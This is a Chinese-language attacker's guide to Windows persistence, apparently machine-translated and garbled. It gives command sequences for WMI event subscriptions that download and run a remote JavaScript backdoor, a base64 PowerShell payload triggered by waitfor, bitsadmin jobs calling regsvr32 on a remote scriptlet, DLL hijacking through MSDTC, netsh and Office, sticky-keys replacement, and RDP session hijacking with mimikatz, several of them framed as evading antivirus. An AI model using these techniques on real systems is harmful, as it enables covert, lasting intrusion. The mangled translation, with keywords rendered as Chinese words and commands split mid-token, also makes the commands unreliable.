> powershell\> Set-WmiInstance -Class FilterToConsumerBinding
> -Namespace"roo t \\ subscription"-Arguments @ {Filter = \$
> WMIEventFilter; Consumer = \$ WMIEvent Consumer}
例：
通常是通过PowerShell 中进行调用，配合的schtasks
进行定时启动，绕过杀软，也可以执行JavaScript 的脚本。
> ＃！电源外壳
>
> \$ filterName =\'filtP1\'
>
> \$ consumerName =\'consP1\'
>
> \$ Command
> ="GetObject（""script：https：//raw.githubusercontent.com/3gstude
> nt/Javascript-Backdoor/master/test""）"
>
> \$ Query ="SELECT \* FROM InstanceModificationEvent WITHIN 60 WHERE
> Targe tInstance ISA\'Win32_PerfFormattedData_PerfOS_System\'"
>
> \$ WMIEventFilter = Set-WmiInstance -Class EventFilter -NameSpace"root
> \\ subs cription"-Arguments @ {Name = \$ filterName; EventNameSpace
> ="root \\ cimv2"; Q ueryLanguage ="WQL"; Query = \$ Query}
> -ErrorAction Stop
>
> \$ WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer
> -Na
>
> mespace"root \\ subscription"-Arguments @ {Name = \$ consumerName;
> ScriptingE ngine =\'JScript\'; ScriptText = \$ Command}
>
> Set-WmiInstance -Class FilterToConsumerBinding -Namespace"root \\
> subscripti on"-Arguments @ {Filter = \$ WMIEventFilter; Consumer = \$
> WMIEventConsumer}
通过远程下载JS 脚本，进行命令调用。 优点：文件无落地
缺点：目前杀软对PowerShell 的这类监管较严格，容易被发现
####### Waitfor.exe
WAITFOR 是用来接收或发送来自同一域内主机的信号。位于System32
下文件夹下，以命令行方式启动。
思路 1：有文件
> 如图 1 所示，在目标系统保存一个的powershell 脚本C：\\
> waitfor1.ps1，内容为： 启动进程calc.exe
>
> cmd / c waitfor persist\`＆\`＆powershell -executionpolicy bypass
> -file c：\\ waitfor1. ps1
>
> 2，等待接受信号
>
> waitfor persist1 && powershell -executionpolicy bypass -file c：\\
> waitfor1.ps1 3，发送信号
>
> waitfor / s 127.0.0.1 / si persist1
>
> ＃测试时不可持续利用
思路 2：无文件
将powershell payload 命令通过编码保存在WMI
类中，进行存储，读取，使用payload（需要管理员权限）
> PowerShell\> \$ StaticClass = New-Object
> Management.ManagementClass（\'root \\ c imv2\'，\$ null，\$ null）
>
> PowerShell\> \$ StaticClass.Name =\'Win32_Backdoor\' PowerShell\> \$
> StaticClass.Put（）\| 外空
>
> PowerShell\> \$ StaticClass.Properties.Add（\'Code\'，"cmd / c start
> calc.exe\`\`\`\`\`\`\`tas kkill / f / im powershell.exe\`\`\`\`\`\`\`&
> waitfor persist\`\`\` ＆\`\`\`＆PowerShell 的-nop -W 隐
>
> 藏-E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAb
> gAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApA \* AUAByAG8AcABlAHIAdABpAGU
> AcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJA
> BlAHgAZQBjAA =="）
>
> PowerShell\> \$ StaticClass.Put（）\| 外空
>
> ＃使用base64 编码存储有效负载
>
> PowerShell\> \$ exec
> =（\[WmiClass\]\'Win32_Backdoor\'）。属性\[\'Code\'\]。值;
>
> ＃读取有效载荷
>
> PowerShell\> iex \$ exec \| 外 空
>
> ＃执行有效负载
>
> ＃也可将上述命令存储为文件，然后执行该文件
>
> ＃https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persist
> ence.ps1
>
> #cmd\> powershell -executionpolicy bypass。\\
> Waitfor-Persistence.ps1激活后门：
>
> cmd\> waitfor / s 127.0.0.1 / si persist
>
> ＃测试时可持续利用
POC：[https](https://github.com/3gstudent/Waitfor-Persistence)：[//github.com/3gstudent/Waitfor-Persistence](https://github.com/3gstudent/Waitfor-Persistence)
####### bitsadmin
bitsadmin.exe 是窗户自带的可用于创建下载或上载作业并监视其进度，
bistadmin
可以指定下载成功之后要进行什么命令。可绕过自动运行，常见杀软检测。
> bitsadmin /创建后门
>
> ＃创建任务
>
> bitsadmin / addfile 后门％comspec %% temp％\\ cmd.exe
>
> ＃下载本地文件
>
> bitsadmin.exe / SetNotifyCmdLine 后门regsv \* .exe"/ u / s
> /i:https://raw.githubuse
> rcontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
>
> ＃增加cmd 参数，利用regsv \*技巧，解决命令执行弹框问题
>
> bitsadmin /恢复后门
>
> ＃执行任务
####### MSDTC
MSDTC，是微软分布式传输协调程序时，Windows
系统默认启动该服务。当计算机加入域中，MSDTC
服务启动时，会搜索注册表计算机
\\HKEYLOCALMACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI 分别加载 3
个DLL：oci.dll，SQLLib80.dll，xa80.dll 然而的Windows
系统默认并不包含oci.dll，所以可以将payload.dll 重名为oci.dll
并保存在％WINDIR％\\ SYSTEM32
\\下 域中的计算机启动服务MSDTC 时就会加载该DLL，实现代码执行。 利用MSDTC
服务加载的dll，实现自启动，并绕过自动运行对启动项的检测。
####### Netsh
netsh 的是视窗系统本身提供的功能强大的网络配置命令行工具
> netsh add helper c:\\test\\netshtest.dll
helper.dll 添加成功后，每次调用netsh，均会加载c:\\test\\netshtest.dll
####### DoubleAgent
该方式主要是对微软系统自带的Application
Verifier（应用程序检验器）进行利用
利用过程如下：
1.  编写自定义Verifier 提供程序DLL
2.  通过Application Verifier 进行安装
3.  注入到目标进程执行的有效载荷
4.  每当目标进程启动，均会执行有效载荷，相当于一个自启动的方式
> 命令行添加：
>
> appverif / verify notepad.exe
>
> 命令行删除：
>
> appverif / n notepad.exe
POC：https://github.com/Cybellum/DoubleAgent
####### office
利用劫持系统的DLL，执行相关命令，同时可绕过自动运行的后门检测主要有两种方法：
劫持office 特定功能 利用office 加载项
> 劫持*office*的特定功能
通过DLL 劫持，在办公软件执行特定功能时触发后门 劫持Word-审阅 - 视图
【 管 理 员 权 限 】 ： 位 于 C：\\ Program Files \\ Common Files \\
microsoft shared \\ RRLoc14 \\ LOCALSVC.DLL 劫持word-插入 -
图片【TrustedInstaller 权限】：位于C：\\ Program Files \\ Common Files
\\ microsoft shared \\ ink \\ tiptsf.dll 劫持word-文件 - 页面布局 -
主题 - 浏览主题【管理员权限】：位于C：\\ Program Files \\ Microsoft
Office \\ Office14 \\ 2052 \\ GrooveIntlResource.dll 劫持Excel-插入 -
图片【管理员权限】：位于C：\\ Program Files \\ Common Files \\ microsoft
shared \\ OFFICE14 \\ MSPTLS.DLL
> 利用*office*加载项
Word WLL Excel XLL Excel VBA 加载项 PowerPoint VBA 加载项 以文字为例：
> ＃编译成calc.dll，重命名为calc.wll，保存在路径：C：\\ Users \\
> Administrator \\ App Data \\ Roaming \\ Microsoft \\ Word \\
> Startup（Startup
> 路径可保存多个wll，支持启动多个wll），启动Word.exe，弹出计算器，并且词正常启动
>
> PowerShell 的下WLL 路径
>
> \$ ENV：APPDATA + "\\微软\\的Word \\启动\\ calc.wll"将编译好的calc.dll
> 作的base64 加密并存储于变量中
>
> PowerShell\> \$ fileContent = \[System.IO.File\] ::
> ReadAllBytes（\'calc.dll\'） PowerShell\> \$ fileContentEncoded =
> \[System.Convert\] :: ToBase64String（\$ fileCon tent）\|
> set-content（"calcdllbase64.txt"）
>
> 用变量\$ fileContent 存储的base64 加密的calc.dll
>
> PowerShell\> \$ fileContent ="\$ fileContentEncoded_payload"的base64
> 解密并释放calc.wll 至启动路径的代码如下：
>
> PowerShell\> \$ fileContentBytes = \[System.Convert\] ::
> FromBase64String（\$ fileCon tent）
>
> \[有System.IO.File\] :: WriteAllBytes（\$ ENV：APPDATA +
> "\\微软\\的Word \\启动\\ cal c.wll"，\$ fileContentBytes）
>
> ＃具体参考：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-mainta
> in-persistence/
其他POC：https://github.com/3gstudent/Office-Persistence
####### shift 后门
通过远程桌面连接到的Windows 后，在没有输入用户名和密码前，连接按 5
次移位键，可以调用C：\\ WINDOWS \\ SYSTEM32 \\
sethc.exe，所以需要把C：\\ WINDOWS \\ SYSTEM32 \\ sethc.exe
替换成其他的执行程序即可执行该程序。
> 复制c：\\ windows \\ system32 \\ cmd.exe c：\\ windows \\ system32 \\
> sethc.exe / y 复制c：\\ windows \\ system32 \\ sethc.exe c：\\ windows
> \\ system32 \\ dllcache \\ s ethc.exe / y
>
> attrib c：\\ windows \\ system32 \\ sethc.exe + h
>
> attrib c：\\ windows \\ system32 \\ dllcache \\ sethc.exe + h #atsri +
> h 是添加隐藏属性
在windows xp 过后，sethc
组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使管理员都只有名义上的只读和可执行权，我们可以手动修改其所属为管理员。
也可以使用命令，比如：使用MSSQL 的xp_cmdshell 的
> exec xp_cmdshell\'takeown / f c：\\ windows \\ system32 \\ sethc。\* /
> a / r / d y\'
>
> ＃将所有者更改为管理员组（administrators）
>
> exec xp_cmdshell\'cacls c：\\ windows \\ system32 \\ sethc.exe / T / E
> / G system： F\'
>
> ＃赋予系统完全控制权限
>
> exec xp_cmdshell\'copy c：\\ windows \\ system32 \\ cmd.exe c：\\
> windows \\ system
>
> 32 \\ sethc.exe / y\'
>
> ＃替换文件为cmd.exe
还有一些其他的热键后门，如： magnify.exe （放大镜后门） osk.exe
（屏幕键盘） narrator.exe (讲述人) displayswitch.exe (扩展屏幕)
atbroker.exe （辅助管理工具）
####### RDP 会话劫持
RDP 劫持简单的说就是在不知道另一账户密码的情况下直接切换到该用户会话下。
> 1，查询用户查看服务器用户会话信息
>
> 2，sc 创建sesshijack 创建一个sesshijack 服务3，net start sesshijack
> 开启服务
>
> 查询用户
>
> sc create sesshijack binpath ="cmd.exe / k tscon 1 / dest：rdp-tcp＃4"
>
> ＃rdp-tcp＃4 为正在活动中的其他会话net start sesshijack
无凭据时的会话劫持技巧是Benjamin Delpy（Mimikatz 作者）在 2011
年提到的，所以Mimikatz 模块也集成了此项功能
> mimikatz.exe mimikatz＃ts :: sessions
>
> mimikatz＃ts :: remote / id：4（4 表示会话ID） mimikatz＃privilege ::
> debug
>
> mimikatz＃ts :: remote / id：4
####### 计划任务
无论是windows 还是Linux
的操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。
> 图形化工具：taskschd.msc 命令行工具：SchTasks.exe SCHTASKS
> /参数\[参数\]
>
> /创建创建新计划任务